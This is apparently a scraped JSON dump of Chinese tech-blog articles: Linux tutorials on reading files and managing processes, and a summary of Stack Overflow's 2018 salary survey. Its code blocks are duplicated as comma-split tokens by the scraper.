或其他几个命令来验证这一点。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@studentvm1 ~]# free\r\n              total        used        free      shared  buff/cache   available\r\nMem:        4038808      382404     2754072        4152      902332     3404184\r\nSwap:      10485756           0    10485756\r\n[root@studentvm1 ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,studentvm1, ,~,],# free, , , , , , , , , , , , , , ,total, , , , , , , , ,used, , , , , , , , ,free, , , , , , ,shared, , ,buff,/,cache, , , ,available,Mem,:, , , , , , , , ,4038808, , , , , , ,382404, , , , , ,2754072, , , , , , , , ,4152, , , , , , ,902332, , , , , ,3404184,Swap,:, , , , , , ,10485756, , , , , , , , , , , ,0, , , , ,10485756,[,root,@,studentvm1, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,请注意，不同的命令以不同的形式显示或要求输入设备文件。在 ,/dev, 目录中访问特定设备有多种方式。在我的文章 ,在 Linux 中管理设备, 中有更多关于 ,/dev, 目录及其内容说明。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114447/", "url_object_id": "232ea959696606719883982b948de247", "front_image_path": "full/daa241c211f453f9b4c5a81e5c318f6d7431a02b.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/10/683fc47a8ae84cd7b957dda2db9cf665.jpg"], "title": "命令行小技巧：读取文件的不同方式", "create_time": "2018/10/21", "vote": "1", "bookmark": "3", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： , Paul W. Frields,   译文出处：,Linux中国/distant1219,   ,\n,作为图形操作系统，Fedora 的使用是令人愉快的。你可以轻松地点击完成任何任务。但你可能已经看到了，在底层还有一个强大的命令行。想要在 shell 下体验，只需要在 Fedora 系统中打开你的终端应用。这篇文章是向你展示常见的命令行使用方法的系列文章之一。,\n,在这部分，你将学习如何以不同的方式读取文件，如果你在系统中打开一个终端完成一些工作，你就有可能需要读取一两个文件。,\n,一应俱全的大餐,\n,对命令行终端的用户来说， ,cat, 命令众所周知。 当你 ,cat, 一个文件，你很容易的把整个文件内容展示在你的屏幕上。而真正发生在底层的是文件一次读取一行，然后一行一行写入屏幕。,\n,假设你有一个文件，叫做 ,myfile,， 这个文件每行只有一个单词。为了简单起见，每行的单词就是这行的行号，就像这样：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\none\r\ntwo\r\nthree\r\nfour\r\nfive,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,one,two,three,four,five,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,所以如果你 ,cat, 这个文件，你就会看到如下输出：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat myfile\r\none\r\ntwo\r\nthree\r\nfour\r\nfive,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat ,myfile,one,two,three,four,five,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,并没有太惊喜，不是吗？ 但是有个有趣的转折，只要使用 ,tac, 命令，你可以从后往前 ,cat, 这个文件。（请注意， Fedora 对这种有争议的幽默不承担任何责任！）,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ tac myfile\r\nfive\r\nfour\r\nthree\r\ntwo\r\none,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,tac ,myfile,five,four,three,two,one,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,cat, 命令允许你以不同的方式装饰输出，比如，你可以输出行号：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat -n myfile\r\n     1 one\r\n     2 two\r\n     3 three\r\n     4 four\r\n     5 five,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat, ,-,n, ,myfile,     ,1, ,one,     ,2, ,two,     ,3, ,three,     ,4, ,four,     ,5, ,five,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,还有其他选项可以显示特殊字符和其他功能。要了解更多, 请运行 ,man cat, 命令， 看完之后，按 ,q, 即可退出回到 shell。,\n,挑选你的食物,\n,通常，文件太长会无法全部显示在屏幕上，您可能希望能够像文档一样查看它。 这种情况下，可以试试 ,less, 命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ less myfile,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,less ,myfile,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你可以用方向键，也可以用 ,PgUp,/,PgDn, 来查看文件， 按 ,q, 就可以退回到 shell。,\n,实际上，还有一个 ,more, 命令，其基于老式的 UNIX 系统命令。如果在退回 shell 后仍想看到该文件的内容，则可能需要使用它。而 ,less, 命令则让你回到你离开 shell 之前的样子，并且清除屏幕上你看到的所有的文件内容。,\n,一点披萨或甜点,\n,有时，你所需的输出只是文件的开头。 比如，有一个非常长的文件，当你使用 ,cat, 命令时，会显示这个文件所有内容，前几行的内容很容易滚动过去，导致你看不到。,head, 命令会帮你获取文件的前几行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ head -n 2 myfile\r\none\r\ntwo,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,head, ,-,n, ,2, ,myfile,one,two,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,同样，你会用 ,tail, 命令来查看文件的末尾几行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ tail -n 3 myfile\r\nthree\r\nfour\r\nfive,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,tail, ,-,n, ,3, ,myfile,three,four,five,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当然，这些只是在这个领域的几个简单的命令。但它们可以让你在阅读文件时容易入手。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 3 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114458/", "url_object_id": "a9bd45a89752136f0978fe478eb5119f", "front_image_path": "full/d76b6f5b61d6d3e3d080011c5e602c185332f67e.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/1d66c6135be63e71744b3b8ec59f5545.jpg"], "title": "哪门编程语言更赚钱？看看 Stack Overflow 的最新调查", "create_time": "2018/09/16", "vote": "2", "bookmark": 0, "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,开源中国社区,   ,Stack Overflow 2018 年最新的薪资计算器已正式推出。最新的计算器除了增加新的国家和地区之外，还更新了数字数据。更新后的薪资计算器新增了 8 个国家和地区的数据，以及更能反映开发者收入的最新数据。,\n,所以，想知道自己的技术能力值多少钱？不妨试用一下 Stack Overflow 2018 年最新的薪资计算器(,https://stackoverflow.com/jobs/salary,)。通过最新的计算器，我们可以看到目前哪些工作岗位在如火如荼地发展着，哪些工作岗位正在走下坡路，而哪些城市的技术从业者收入最高。,\n,\n,薪资计算器的统计维度：坐标、教育程度、编码年龄、所属岗位以及专业擅长的技能,\n,不难发现，与 2017 年相比，开发者的收入整体有所增加。其中，在伦敦和旧金山等技术较为发达的地区，薪资中位数较 2017 年平均上涨约 25%。由此看来，今年的技术市场还是很乐观的。,\n,而收入最高的职位 —— DevOps 专家在多个国家都是稳坐第一（美国、德国、印度和英国）。DevOps 专家是收入最高的开发者。美国 DevOps 专家的年薪中位数接近 10 万美元。其他最高收入的职位是数据科学家、后端开发者、移动开发者、游戏或图形开发者以及全栈开发者。与此同时，所有国家和地区薪水垫底的职位都是设计人员和数据库管理员。,\n,下面来说一下开发者最关心的语言问题，究竟哪门编程语言最受雇主青睐呢？值得各位关注的是，Go 语言开发者成了高收入者。要知道，Go 目前还不是流行的编程语言，企业仍倾向于使用更成熟的旧语言。在二十五种最常用的语言中，Java 是使用最为广泛的语言，而 JavaScript 占据了第二位。新进者 Go 语言位居第 20 位，Scala 位居第 19 位。,\n,薪资计算器中的数字也可以与 Stack Overflow 2018 问卷调查中的高薪技术清单进行比较，其中 Scala 和 Go 语言在列表中的位置相对较高。,\n,下面大家继续看看 Stack Overflow 2018 调查的相关内容：,\n,全球职业占比,\n,\n,在职业占比的调查中，我们发现，前三分别是：后端开发、全栈开发和前端开发。有近 60% 的受访者将自己视为后端开发，大约 20％ 的受访者认为自己是移动开发。,\n,对开源的贡献,\n,\n,Stack Overflow 上几乎有一半的专业开发人员参与了开源项目。 参与开源的方式因语言而异。 超过 70％ 的使用 Rust，Julia 和 Clojure 的开发人员参与开源，而使用 VBA，VB.NET 和 C＃的开发人员中只有不到 40％。,\n,码龄,\n,\n,超过一半的受访者拥有五以内的专业编码经验。 使用 Cobol 和 Perl 等语言的开发人员编码经验最丰富，而使用 Matlab，Haskell 和 Kotlin 等则相反。,\n,不同开发领域的开发经验,\n,\n,在不同软件开发领域工作的开发人员具有不同的工作经验。 调查发现，DevOps 专家和开发人员拥有最丰富的开发经验。 DevOps 作为一门学科和专业身份相对较新，但在这一领域工作的人员经验丰富。 游戏/图形开发人员和移动开发人员拥有最少的经验。,\n,起床时间,\n,\n,有的开发者可能准时下班到家，有点可能加班到深夜，有的可能天亮才躺在床上。不管什么情况，大多数开发者表示他们一般是 8 点起床。,\n,敲电脑的时间,\n,\n,受访者包括专业开发人员、学生和业余爱好者，他们中的绝大多数表示，醒着的大部分时间都待在电脑旁。,\n,生活习惯,\n,\n,\n,调查显示，开发者在饮食方面比较规律，64% 的开发者都会按时吃饭。在锻炼情况方面，超过 60％ 的受访者表示至少每周锻炼一次，但从整体分布来看，从不锻炼的开发者占比也不少。,\n,开发语言,\n,\n,JavaScript 连续六年成为最常用的编程语言。 Python 在今年的排名上升，超过 C＃，就像去年超过 PHP 一样。 Python 也成为今年增长最快的编程语言。,\n,最受开发者喜爱的语言,\n,\n,\n,最想尝试的语言,\n,\n,\n,语言对应薪资,\n,\n,\n,在,受欢迎,的几门编程语言中，,Go 语言开发者的薪资处于较高水平,。,\n,框架库和工具,\n,\n,Node.js 和 AngularJS 仍然是此类别中最常用的技术，React 和 .Net Core 对许多开发人员来说也很重要。,\n,数据库,\n,\n,桌面/服务器使用率,\n,\n,最受喜爱的桌面/服务器,\n,\n,最受欢迎的开发环境,\n,\n,由于很多调查的调查结果与中国国内情况不太相符，或存在一定偏差，使得国内开发者怀疑，这些个调查到底有没有把中国考虑在内。对此，小编专门看了一眼调查发布图：,\n,\n,主要大头集中在美国和印度地区，中国调查占比 1.0%。emmm… 事实证明，中国的确是有考虑在内的，由于占比偏低，最终结果可能存在偏差，以下调查结果仅供参考，如有异议欢迎留言分享！,\n,详情请参考 ,Stack Overflow, 的调查。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        ,  收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114388/", "url_object_id": "5c7160e2f1b3bb8d9429b0096006bb95", "front_image_path": "full/f91b50cabfac3ffddce3fd3f9459483f457d2ea9.jpg"},{"front_image_url": ["https://dn-linuxcn.qbox.me/data/attachment/album/201809/16/225342dggc8idpid9mpp85.png"], "title": "有效管理进程的 8 个 Linux 命令", "create_time": "2018/09/18", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Alan Formy-duval,   译文出处：,Linux中国/heguangzhi,   ,\n,一般来说，应用程序进程的生命周期有三种主要状态：启动、运行和停止。如果我们想成为称职的管理员，每个状态都可以而且应该得到认真的管理。这八个命令可用于管理进程的整个生命周期。,\n,启动进程,\n,启动进程的最简单方法是在命令行中键入其名称，然后按回车键。如果要启动 Nginx web 服务器，请键入 ,nginx, 。也许您只是想看看其版本。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ nginx\r\n\r\nalan@workstation:~$ nginx -v\r\nnginx version: nginx/1.14.0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,nginx, ,alan,@,workstation,:,~,$, ,nginx, ,-,v,nginx ,version,:, ,nginx,/,1.14.0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,查看您的可执行路径,\n,以上启动进程的演示是假设可执行文件位于您的可执行路径中。理解这个路径是可靠地启动和管理进程的关键。管理员通常会为他们想要的目的定制这条路径。您可以使用 ,echo $PATH, 查看您的可执行路径。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ echo $PATH\r\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,echo, ,$,PATH,/,usr,/,local,/,sbin,:,/,usr,/,local,/,bin,:,/,usr,/,sbin,:,/,usr,/,bin,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,WHICH,\n,使用 ,which, 命令查看可执行文件的完整路径。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ which nginx\r\n/opt/nginx/bin/nginx,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,which ,nginx,/,opt,/,nginx,/,bin,/,nginx,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我将使用流行的 web 服务器软件 Nginx 作为我的例子。假设安装了 Nginx。如果执行 ,which nginx, 的命令什么也不返回，那么是找不到 Nginx 了，因为它只搜索您指定的可执行路径。有三种方法可以补救一个进程不能简单地通过名字启动的情况。首先是键入完整路径 —— 虽然，我不情愿输入全部路径，您会吗？,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ /home/alan/web/prod/nginx/sbin/nginx -v\r\nnginx version: nginx/1.14.0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,/,home,/,alan,/,web,/,prod,/,nginx,/,sbin,/,nginx, ,-,v,nginx ,version,:, ,nginx,/,1.14.0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,第二个解决方案是将应用程序安装在可执行文件路径中的目录中。然而，这有时可能是办不到的，特别是如果您没有 root 权限。,\n,第三个解决方案是更新您的可执行路径环境变量，包括要使用的特定应用程序的安装目录。这个解决方案是与 shell 相关的。例如，Bash 用户需要在他们的 ,.bashrc, 文件中编辑 ,PATH=, 行。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nPATH=\"$HOME/web/prod/nginx/sbin:$PATH\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,PATH,=,\"$HOME/web/prod/nginx/sbin:$PATH\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，重复您的 ,echo, 和 ,which, 命令或者尝试检查版本。容易多了！,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ echo $PATH\r\n/home/alan/web/prod/nginx/sbin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\r\n\r\nalan@workstation:~$ which nginx\r\n/home/alan/web/prod/nginx/sbin/nginx\r\n\r\nalan@workstation:~$ nginx -v                                                \r\nnginx version: nginx/1.14.0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,echo, ,$,PATH,/,home,/,alan,/,web,/,prod,/,nginx,/,sbin,:,/,usr,/,local,/,sbin,:,/,usr,/,local,/,bin,:,/,usr,/,sbin,:,/,usr,/,bin, ,alan,@,workstation,:,~,$, ,which ,nginx,/,home,/,alan,/,web,/,prod,/,nginx,/,sbin,/,nginx, ,alan,@,workstation,:,~,$, ,nginx, ,-,v, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,nginx ,version,:, ,nginx,/,1.14.0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,保持进程运行,\n,NOHUP,\n,注销或关闭终端时，进程可能不会继续运行。这种特殊情况可以通过在要使用 ,nohup, 命令放在要运行的命令前面让进程持续运行。此外，附加一个,&, 符号将会把进程发送到后台，并允许您继续使用终端。例如，假设您想运行 ,myprogram.sh, 。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nnohup myprogram.sh &,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,nohup ,myprogram,.,sh, ,&,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,nohup, 会返回运行进程的 PID。接下来我会更多地谈论 PID。,\n,管理正在运行的进程,\n,每个进程都有一个唯一的进程标识号 (PID) 。这个数字是我们用来管理每个进程的。我们还可以使用进程名称，我将在下面演示。有几个命令可以检查正在运行的进程的状态。让我们快速看看这些命令。,\n,PS,\n,最常见的是 ,ps, 命令。,ps, 的默认输出是当前终端中运行的进程的简单列表。如下所示，第一列包含 PID。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ ps\r\nPID TTY          TIME CMD\r\n23989 pts/0    00:00:00 bash\r\n24148 pts/0    00:00:00 ps,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,ps,PID ,TTY, , , , , , , , , , ,TIME ,CMD,23989, ,pts,/,0, , , , ,00,:,00,:,00, ,bash,24148, ,pts,/,0, , , , ,00,:,00,:,00, ,ps,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我想看看我之前启动的 Nginx 进程。为此，我告诉 ,ps, 给我展示每一个正在运行的进程（,-e,）和完整的列表（,-f,）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ ps -ef\r\nUID        PID  PPID  C STIME TTY          TIME CMD\r\nroot         1     0  0 Aug18 ?        00:00:10 /sbin/init splash\r\nroot         2     0  0 Aug18 ?        00:00:00 [kthreadd]\r\nroot         4     2  0 Aug18 ?        00:00:00 [kworker/0:0H]\r\nroot         6     2  0 Aug18 ?        00:00:00 [mm_percpu_wq]\r\nroot         7     2  0 Aug18 ?        00:00:00 [ksoftirqd/0]\r\nroot         8     2  0 Aug18 ?        00:00:20 [rcu_sched]\r\nroot         9     2  0 Aug18 ?        00:00:00 [rcu_bh]\r\nroot        10     2  0 Aug18 ?        00:00:00 [migration/0]\r\nroot        11     2  0 Aug18 ?        00:00:00 [watchdog/0]\r\nroot        12     2  0 Aug18 ?        00:00:00 [cpuhp/0]\r\nroot        13     2  0 Aug18 ?        00:00:00 [cpuhp/1]\r\nroot        14     2  0 Aug18 ?        00:00:00 [watchdog/1]\r\nroot        15     2  0 Aug18 ?        00:00:00 [migration/1]\r\nroot        16     2  0 Aug18 ?        00:00:00 [ksoftirqd/1]\r\nalan     20506 20496  0 10:39 pts/0    00:00:00 bash\r\nalan     20520  1454  0 10:39 ?        00:00:00 nginx: master process nginx\r\nalan     20521 20520  0 10:39 ?        00:00:00 nginx: worker process\r\nalan     20526 20506  0 10:39 pts/0    00:00:00 man ps\r\nalan     20536 20526  0 10:39 pts/0    00:00:00 pager\r\nalan     20564 20496  0 10:40 pts/1    00:00:00 bash,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,ps, ,-,ef,UID, , , , , , , , ,PID, , ,PPID, , ,C, ,STIME ,TTY, , , , , , , , , , ,TIME ,CMD,root, , , , , , , , , ,1, , , , , ,0, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,10, ,/,sbin,/,init ,splash,root, , , , , , , , , ,2, , , , , ,0, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,kthreadd,],root, , , , , , , , , ,4, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,kworker,/,0,:,0H,],root, , , , , , , , , ,6, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,mm_percpu_wq,],root, , , , , , , , , ,7, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,ksoftirqd,/,0,],root, , , , , , , , , ,8, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,20, ,[,rcu_sched,],root, , , , , , , , , ,9, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,rcu_bh,],root, , , , , , , , ,10, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,migration,/,0,],root, , , , , , , , ,11, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,watchdog,/,0,],root, , , , , , , , ,12, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,cpuhp,/,0,],root, , , , , , , , ,13, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,cpuhp,/,1,],root, , , , , , , , ,14, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,watchdog,/,1,],root, , , , , , , , ,15, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,migration,/,1,],root, , , , , , , , ,16, , , , , ,2, , ,0, ,Aug18, ,?, , , , , , , , ,00,:,00,:,00, ,[,ksoftirqd,/,1,],alan, , , , , ,20506, ,20496, , ,0, ,10,:,39, ,pts,/,0, , , , ,00,:,00,:,00, ,bash,alan, , , , , ,20520, , ,1454, , ,0, ,10,:,39, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,master ,process ,nginx,alan, , , , , ,20521, ,20520, , ,0, ,10,:,39, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,worker ,process,alan, , , , , ,20526, ,20506, , ,0, ,10,:,39, ,pts,/,0, , , , ,00,:,00,:,00, ,man ,ps,alan, , , , , ,20536, ,20526, , ,0, ,10,:,39, ,pts,/,0, , , , ,00,:,00,:,00, ,pager,alan, , , , , ,20564, ,20496, , ,0, ,10,:,40, ,pts,/,1, , , , ,00,:,00,:,00, ,bash,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,您可以在上面 ,ps, 命令的输出中看到 Nginx 进程。这个命令显示了将近 300 行，但是我在这个例子中缩短了它。可以想象，试图处理 300 行过程信息有点混乱。我们可以将这个输出输送到 ,grep,，过滤一下仅显示 nginx。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ ps -ef |grep nginx\r\nalan     20520  1454  0 10:39 ?        00:00:00 nginx: master process nginx\r\nalan     20521 20520  0 10:39 ?        00:00:00 nginx: worker process,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,ps, ,-,ef, ,|,grep ,nginx,alan, , , , , ,20520, , ,1454, , ,0, ,10,:,39, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,master ,process ,nginx,alan, , , , , ,20521, ,20520, , ,0, ,10,:,39, ,?, , , , , , , , ,00,:,00,:,00, ,nginx,:, ,worker ,process,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,确实更好了。我们可以很快看到，Nginx 有 20520 和 20521 的 PID。,\n,PGREP,\n,pgrep, 命令更加简化单独调用 ,grep, 遇到的问题。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ pgrep nginx\r\n20520\r\n20521,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,pgrep ,nginx,20520,20521,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,假设您在一个托管环境中，多个用户正在运行几个不同的 Nginx 实例。您可以使用 ,-u, 选项将其他人排除在输出之外。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalan@workstation:~$ pgrep -u alan nginx\r\n20520\r\n20521,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alan,@,workstation,:,~,$, ,pgrep, ,-,u, ,alan 